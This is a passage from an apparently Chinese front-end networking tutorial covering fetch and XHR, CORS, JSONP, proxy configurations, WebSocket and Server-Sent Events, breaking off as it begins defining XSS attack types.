class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;API error&#x27;</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>();<br>  &#125;);<br><br><span class="hljs-comment">// XHR (直接检测status)</span><br>xhr.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.<span class="hljs-property">status</span> &lt; <span class="hljs-number">300</span>) &#123;<br>    <span class="hljs-comment">// 成功</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 处理错误</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>最佳实践建议</strong></p><ul><li>优先使用 Fetch：现代项目首选（浏览器支持率 &gt; 98%），配合 async&#x2F;await 提升可读性：</li><li>XHR 适用场景：<ul><li>需要上传&#x2F;下载进度条（xhr.upload.onprogress）</li><li>兼容 IE11 等老旧浏览器</li></ul></li><li>补充工具：<ul><li>超时处理和中断请求：</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>(), <span class="hljs-number">5000</span>);<br><span class="hljs-title function_">fetch</span>(url, &#123; <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> &#125;);<br></code></pre></td></tr></table></figure><h3 id="跨域解决方案（CORS机制-JSONP-代理服务器）"><a href="#跨域解决方案（CORS机制-JSONP-代理服务器）" class="headerlink" title="跨域解决方案（CORS机制&#x2F;JSONP&#x2F;代理服务器）"></a>跨域解决方案（CORS机制&#x2F;JSONP&#x2F;代理服务器）</h3><p><strong>CORS（跨域资源共享）</strong></p><p>核心原理：</p><p>浏览器通过 HTTP头部协商 决定是否允许跨域请求，由服务器声明哪些外部域可访问资源。</p><p>关键流程：</p><ul><li>简单请求（Simple Request）：<ul><li>条件：GET&#x2F;HEAD&#x2F;POST + 特定头部（如Accept&#x2F;Content-Type: text&#x2F;plain）</li><li>浏览器直接发送请求，服务器响应：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com  // 必须指定具体域名或*<br></code></pre></td></tr></table></figure></li><li>预检请求（Preflight Request）：<ul><li>触发条件：复杂操作（如PUT&#x2F;自定义头部&#x2F;Content-Type: application&#x2F;json）</li><li>浏览器先发OPTIONS请求：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">OPTIONS</span> <span class="hljs-string">/api/data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://client.com<br><span class="hljs-attribute">Access-Control-Request-Method</span><span class="hljs-punctuation">: </span>PUT<br><span class="hljs-attribute">Access-Control-Request-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br></code></pre></td></tr></table></figure><ul><li>服务器响应策略：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">204</span> No Content<br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com<br><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>GET, POST, PUT<br><span class="hljs-attribute">Access-Control-Allow-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br><span class="hljs-attribute">Access-Control-Max-Age</span><span class="hljs-punctuation">: </span>86400  // 缓存预检结果（秒）<br></code></pre></td></tr></table></figure></li><li>带凭证的请求：<ul><li>前端设置：fetch(url, { credentials: ‘include’ })</li><li>服务器响应：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com  // 不可用*<br><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true<br></code></pre></td></tr></table></figure></li></ul><p>前端代码示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 允许跨域的服务器响应头</span><br>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;https://client.com&#x27;</span>);<br>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="hljs-string">&#x27;GET, POST&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>SONP（JSON with Padding）</strong></p><p>原理：</p><p>利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性，通过回调函数接收跨域数据。</p><p>实现步骤：</p><p>（1）前端定义全局回调函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received:&#x27;</span>, data);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）动态创建 <code>&lt;script&gt;</code> 标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://api.example.com/data?callback=handleResponse&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);<br></code></pre></td></tr></table></figure><p>（3）服务器返回函数调用包裹的 JSON</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">handleResponse</span>(&#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-attr">data</span>: [...] &#125;);<br></code></pre></td></tr></table></figure><p>局限性：</p><ul><li>仅支持 GET 请求</li><li>无错误处理机制（无法捕获404&#x2F;500）</li><li>存在XSS风险（需信任服务器）</li></ul><p><strong>代理服务器（Proxy Server）</strong></p><p>原理：</p><p>将跨域请求转发到同源代理服务器，由代理访问目标服务，避开浏览器同源策略。</p><p>实现方式：</p><p>（1）开发环境代理</p><p>适用场景：前端本地开发调试</p><p>实现工具：webpack.devServer</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;https://api.example.com&#x27;</span>,<br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123; <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）生产环境反向代理</p><p>适用场景：线上部署</p><p>主流方案：nginx 配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>  <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>  <span class="hljs-attribute">server_name</span> my-domain.com;<br><br>  <span class="hljs-section">location</span> /api/ &#123;<br>    <span class="hljs-attribute">proxy_pass</span> https://api.example.com/;  <span class="hljs-comment"># 目标地址</span><br>    <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）无服务器代理</p><p>适用场景：无需维护基础设施</p><p>实现方案：Cloudflare Workers</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleRequest</span>(event.<span class="hljs-property">request</span>))<br>&#125;)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRequest</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>);<br>  url.<span class="hljs-property">hostname</span> = <span class="hljs-string">&#x27;api.example.com&#x27;</span>;  <span class="hljs-comment">// 替换目标域名</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(url.<span class="hljs-title function_">toString</span>(), request);<br>&#125;<br></code></pre></td></tr></table></figure><p>（4）编程式中间件代理</p><p>适用场景：自定义代理逻辑</p><p>实现方式：Node.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; createProxyMiddleware &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-proxy-middleware&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/external-api&#x27;</span>, <span class="hljs-title function_">createProxyMiddleware</span>(&#123;<br>  <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;https://third-party.com&#x27;</span>,<br>  <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">onProxyReq</span>: <span class="hljs-function">(<span class="hljs-params">proxyReq, req</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 添加自定义请求头</span><br>    proxyReq.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;X-Proxy-Source&#x27;</span>, <span class="hljs-string">&#x27;my-server&#x27;</span>);<br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>方案对比与选型</strong></p><table><thead><tr><th align="left">方案</th><th align="left">适用场景</th><th align="left">安全性</th><th align="left">复杂度</th><th align="left">协议支持</th></tr></thead><tbody><tr><td align="left">CORS</td><td align="left">可控的第三方API</td><td align="left">★★★</td><td align="left">★★</td><td align="left">全HTTP方法</td></tr><tr><td align="left">JSONP</td><td align="left">老旧浏览器兼容</td><td align="left">★</td><td align="left">★</td><td align="left">仅GET</td></tr><tr><td align="left">代理</td><td align="left">无法修改响应头的API</td><td align="left">★★★</td><td align="left">★★★</td><td align="left">全协议</td></tr></tbody></table><p><strong>安全风险规避</strong></p><ul><li>CORS：严格设置 Access-Control-Allow-Origin 为具体域名（禁用*）</li><li>JSONP：验证返回数据 + CSP防护</li><li>代理：限制可转发的域名防止滥用</li><li>所有方案均需配合HTTPS防止中间人攻击</li></ul><h2 id="2-2-实时通信"><a href="#2-2-实时通信" class="headerlink" title="2.2 实时通信"></a>2.2 实时通信</h2><h3 id="WebSocket协议（双向通信-心跳检测）"><a href="#WebSocket协议（双向通信-心跳检测）" class="headerlink" title="WebSocket协议（双向通信&#x2F;心跳检测）"></a>WebSocket协议（双向通信&#x2F;心跳检测）</h3><p><strong>双向通信机制</strong></p><p>基础原理：在单个TCP连接上建立全双工通信通道，实现客户端与服务器之间的持续双向数据流。</p><p>链接建立流程：</p><p>（1）HTTP握手升级：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/chat</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket          // 协议升级头<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade<br><span class="hljs-attribute">Sec-WebSocket-Key</span><span class="hljs-punctuation">: </span>dGhlIHNhbXBsZSBub25jZQ==  // 客户端随机密钥<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">101</span> Switching Protocols<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade<br><span class="hljs-attribute">Sec-WebSocket-Accept</span><span class="hljs-punctuation">: </span>s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  // 服务端验证响应<br></code></pre></td></tr></table></figure><p>（2）协议转换</p><ul><li>TCP连接保持打开状态</li><li>通信协议从HTTP切换为WebSocket（端口不变，默认80&#x2F;443）</li></ul><p>数据帧结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0                   1                   2                   3<br>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<br>+-+-+-+-+-------+-+-------------+-------------------------------+<br>|F|R|R|R| opcode|M| Payload len |    Extended payload length   |<br>|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |<br>|N|V|V|V|       |S|             |   (if payload len==126/127)   |<br>| |1|2|3|       |K|             |                               |<br>+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +<br>|     Extended payload length continued, if payload len == 127  |<br>+ - - - - - - - - - - - - - - - +-------------------------------+<br>|                               |Masking-key, if MASK set to 1  |<br>+-------------------------------+-------------------------------+<br>| Masking-key (continued)       |          Payload Data         |<br>+-------------------------------- - - - - - - - - - - - - - - - +<br>:                     Payload Data continued ...                :<br>+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +<br>|                     Payload Data continued ...                |<br>+---------------------------------------------------------------+<br></code></pre></td></tr></table></figure><ul><li>opcode：数据类型（1&#x3D;文本，2&#x3D;二进制）</li><li>Payload len：数据长度（支持分片传输）</li><li>Masking-key：客户端到服务端数据掩码（安全规范）</li></ul><p><strong>心跳检测（Heartbeat）</strong></p><p>核心目的：</p><ul><li>检测连接存活状态</li><li>防止中间设备（NAT&#x2F;防火墙）断开”空闲”连接</li></ul><p>实现机制：</p><ul><li>心跳包：定时发送特殊控制帧（Ping&#x2F;Pong）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 浏览器端发送Ping</span><br>websocket.<span class="hljs-title function_">ping</span>();<br><br><span class="hljs-comment">// 服务端响应Pong（自动回复）</span><br>websocket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;ping&#x27;</span>, <span class="hljs-function">() =&gt;</span> websocket.<span class="hljs-title function_">pong</span>());<br></code></pre></td></tr></table></figure><ul><li>帧类型：</li></ul><table><thead><tr><th align="left">类型</th><th align="left">方向</th><th align="left">载荷长度</th></tr></thead><tbody><tr><td align="left">Ping</td><td align="left">客户端 → 服务器</td><td align="left">0-125字节</td></tr><tr><td align="left">Pong</td><td align="left">服务器 → 客户端</td><td align="left">同Ping</td></tr></tbody></table><p>配置参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://example.com&#x27;</span>);<br><span class="hljs-comment">// 心跳间隔（建议25-30秒，小于NAT超时时间）</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (ws.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) &#123;<br>    ws.<span class="hljs-title function_">ping</span>();  <span class="hljs-comment">// 发送心跳</span><br>  &#125;<br>&#125;, <span class="hljs-number">25000</span>);<br></code></pre></td></tr></table></figure><p>异常处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">ws.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;close&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">code</span> === <span class="hljs-number">1006</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;连接异常断开（心跳超时）&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>与传统 HTTP 对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">WebSocket</th><th align="left">HTTP轮询&#x2F;长轮询</th></tr></thead><tbody><tr><td align="left">连接方式</td><td align="left">1个持久TCP连接（全双工）</td><td align="left">多次HTTP请求（半双工）</td></tr><tr><td align="left">头部开销</td><td align="left">首次握手后仅2-14字节帧头</td><td align="left">每次请求完整HTTP头部</td></tr><tr><td align="left">延迟</td><td align="left">毫秒级实时推送</td><td align="left">数百毫秒至秒级</td></tr><tr><td align="left">适用场景</td><td align="left">聊天&#x2F;实时游戏&#x2F;金融报价</td><td align="left">简单通知（兼容性要求高）</td></tr></tbody></table><p><strong>前端开发实践</strong></p><p>（1）浏览器 API</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://api.example.com/ws&#x27;</span>);<br><br><span class="hljs-comment">// 监听消息</span><br>ws.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;收到数据:&#x27;</span>, event.<span class="hljs-property">data</span>);<br>&#125;;<br><br><span class="hljs-comment">// 发送数据</span><br>ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;subscribe&#x27;</span>, <span class="hljs-attr">channel</span>: <span class="hljs-string">&#x27;news&#x27;</span> &#125;));<br><br><span class="hljs-comment">// 错误处理</span><br>ws.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;WebSocket错误:&#x27;</span>, error);<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）关键优化</p><ul><li>二进制传输</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 发送ArrayBuffer提升性能</span><br><span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">128</span>);<br>ws.<span class="hljs-title function_">send</span>(buffer);<br></code></pre></td></tr></table></figure><ul><li>自动重连</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">ws.<span class="hljs-property">onclose</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(connect, <span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><ul><li>流量控制：监控ws.bufferedAmount避免内存溢出</li></ul><p><strong>协议限制</strong></p><ul><li>不支持HTTP&#x2F;2多路复用（需独立连接）</li><li>移动网络切换时需手动重连</li><li>旧版代理可能阻断WebSocket流量</li></ul><blockquote><p>现代浏览器支持率：全局 &gt; 98%（包括移动端）</p></blockquote><h3 id="Server-Sent-Events（SSE）应用场景"><a href="#Server-Sent-Events（SSE）应用场景" class="headerlink" title="Server-Sent Events（SSE）应用场景"></a>Server-Sent Events（SSE）应用场景</h3><p><strong>SSE 核心特性</strong></p><p>协议本质：基于 HTTP 的单向通信协议，允许服务器主动向客户端推送文本数据，保持长连接。</p><p>技术特点：</p><table><thead><tr><th align="left">特性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">单向通信</td><td align="left">仅服务端→客户端方向（对比 WebSocket 双向）</td></tr><tr><td align="left">HTTP 基础</td><td align="left">使用标准 HTTP 协议，无额外端口需求</td></tr><tr><td align="left">自动重连</td><td align="left">内置断线重连机制（客户端自动恢复连接）</td></tr><tr><td align="left">轻量级协议</td><td align="left">数据格式简单（纯文本流），协议开销小</td></tr><tr><td align="left">浏览器原生支持</td><td align="left">通过 EventSource API 实现（IE 除外）</td></tr></tbody></table><p><strong>技术选型对比</strong></p><table><thead><tr><th align="left">场景需求</th><th align="left">SSE</th><th align="left">WebSocket</th><th align="left">HTTP 轮询</th></tr></thead><tbody><tr><td align="left">服务器→客户端单向推送</td><td align="left">✔️ 最佳</td><td align="left">⚠️ 过度设计</td><td align="left">❌ 高延迟</td></tr><tr><td align="left">双向交互</td><td align="left">❌ 不支持</td><td align="left">✔️ 原生支持</td><td align="left">❌ 低效</td></tr><tr><td align="left">浏览器兼容性</td><td align="left">✔️ 除IE</td><td align="left">✔️ 广泛</td><td align="left">✔️ 全支持</td></tr><tr><td align="left">协议复杂度</td><td align="left">★☆☆</td><td align="left">★★★</td><td align="left">★★☆</td></tr><tr><td align="left">部署成本</td><td align="left">★☆☆</td><td align="left">★★☆</td><td align="left">★☆☆</td></tr></tbody></table><p><strong>最佳实践</strong></p><p>（1）前端实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> es = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(<span class="hljs-string">&#x27;/api/stream&#x27;</span>);<br><br><span class="hljs-comment">// 监听自定义事件</span><br>es.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;stock&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>  <span class="hljs-title function_">renderStock</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">data</span>));<br>&#125;);<br><br><span class="hljs-comment">// 错误处理 + 自动重连</span><br>es.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  es.<span class="hljs-title function_">close</span>();<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(...), <span class="hljs-number">5000</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）服务端要求</p><ul><li>响应头设置：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/event-stream<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure><ul><li>数据格式规范：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">event: notification  // 事件类型<br>id: 1678901234       // 消息ID（用于断线续传）<br>data: &#123;&quot;msg&quot;:&quot;Hello&quot;&#125;// 数据内容（可多行）<br>retry: 10000         // 重连间隔（毫秒）<br>\n\n                 // 消息结束符（两个换行）<br></code></pre></td></tr></table></figure><p><strong>不适用场景</strong></p><ul><li>需要客户端频繁上传数据（如实时游戏）→ 选 WebSocket</li><li>二进制数据传输（如视频流）→ 选 WebRTC&#x2F;WebSocket</li><li>IE 浏览器支持 → 降级为 HTTP 长轮询</li></ul><p><strong>理想适用场景</strong></p><ul><li>只读数据流</li><li>低频事件通知</li><li>简单进度更新</li><li>兼容标准 HTTP 基础设施</li></ul><blockquote><p>在 90% 的服务器推送场景中，SSE 相比 WebSocket 可减少 40% 开发量</p></blockquote><h1 id="三、网络安全"><a href="#三、网络安全" class="headerlink" title="三、网络安全"></a>三、网络安全</h1><h2 id="3-1-攻击防护"><a href="#3-1-攻击防护" class="headerlink" title="3.1 攻击防护"></a>3.1 攻击防护</h2><h3 id="XSS（跨站脚本）与防御（内容编码-CSP）"><a href="#XSS（跨站脚本）与防御（内容编码-CSP）" class="headerlink" title="XSS（跨站脚本）与防御（内容编码&#x2F;CSP）"></a>XSS（跨站脚本）与防御（内容编码&#x2F;CSP）</h3><p><strong>XSS攻击原理与分类</strong></p><p>定义：攻击者向网页注入恶意脚本，当用户访问时脚本在浏览器执行，窃取数据或篡改页面。</p><p>攻击类型：</p><table><thead><tr><th align="left">类型</th><th align="left">注入方式</th><th align="left">案例场景</th></tr></thead><tbody><tr><td align="left">存储型XSS</td><td align="left">恶意脚本存入数据库（如评论&#x2F;消息）</td><td align="left">用户浏览含攻击脚本的论坛页面</td></tr><tr><td align="left">反射型XSS</td><td align="left">脚本通过URL参数注入并即时返回</td><td align="left">钓鱼邮件诱导点击含恶意URL</td></tr><tr><td align="left">DOM型XSS</td><td align="left">前端JS操作DOM时注入</td><td 